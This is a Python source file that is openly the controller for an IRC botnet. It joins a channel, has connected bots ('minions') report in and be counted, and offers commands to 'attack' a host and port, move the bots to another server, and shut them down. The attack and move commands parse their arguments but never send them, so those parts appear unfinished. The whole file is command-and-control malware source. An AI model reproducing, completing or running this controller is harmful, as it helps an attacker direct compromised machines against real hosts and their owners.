import sys, os
import socket
import select
import signal

def interrupted(signum, frame):
    print("", end="")
signal.signal(signal.SIGALRM, interrupted)

try:
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    channel = sys.argv[3]
    secretphase = sys.argv[4]
except:
    print("must state host name, port, channel, and secret phase\n\rexiting...", file=sys.stderr)
    sys.exit(-1)

# connect to irc
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.connect((hostname, port))
irc.setblocking(0)

# some initialising stuff
nickname = "BetterThanYou"
irc.send(bytes("USER TheController 8 * : I'm The Best\r\n", "utf-8"))
irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))

minions = []
response = ""
command = ""
print("It is I, the best controller evarrr. Connecting with nick: " + nickname)

while 1:
    ready = select.select([irc], [], [], 2) # wait 2 seconds
    if ready[0]:
        response = (irc.recv(1024)).decode("utf-8")
        #print(response)

    if response.split(" ", 1)[0] == "PING":
        argument = response.split(" ", 2)[1]
        irc.send(bytes("PONG " + argument + "\r\n", "utf-8"))
        #print("PONG " + argument)


    # wait for a few seconds?
    signal.alarm(1)
    try:
        command = input("")
    except:
        continue
    signal.alarm(0)


    if command == "status":
        irc.send(bytes("PRIVMSG #" + channel + " :To me, my minions\r\n", "utf-8"))
        print("Calling all of my minions to answer back to me")
        while 1:
            ready = select.select([irc], [], [], 2) # wait 2 seconds
            if ready[0]:
                response = (irc.recv(1024)).decode("utf-8")
                size = len(response.split())
                follower = response.split(" ", size)[size-1]
                follower = follower.split(":", 2)[1]
                minions.append(follower.strip("\r\n"))
            else: break
        if len(minions) < 1:
            print("Where are my minions? I have none...")
        else:
            print("I have", len(minions), "minion(s) wahahaha")
            naming = ""
            for i, m in enumerate(minions):
                if i == 0:
                    naming = m
                else:
                    naming = naming + ", " + m
            print("Minions: " + naming + ".")




    if command.split(" ", 1)[0] == "attack":
        try:
            hostname = command.split(" ", 2)[1]
            port = command.split(" ", 3)[2]
        except:
            print("O M Goodnesses, do it right next time!")

    if command.split(" ", 1)[0] == "move":
        try:
            hostname = command.split(" ", 2)[1]
            port = command.split(" ", 3)[2]
            channel = command.split(" ", 4)[3]
        except:
            print("O M Goodnesses, do it right next time!")

    if command == "quit":
        irc.send(b"QUIT\r\n")
        sys.exit(0)

    if command == "shutdown":
        irc.send(bytes("PRIVMSG #" + channel + " :Go home, guys\r\n", "utf-8"))
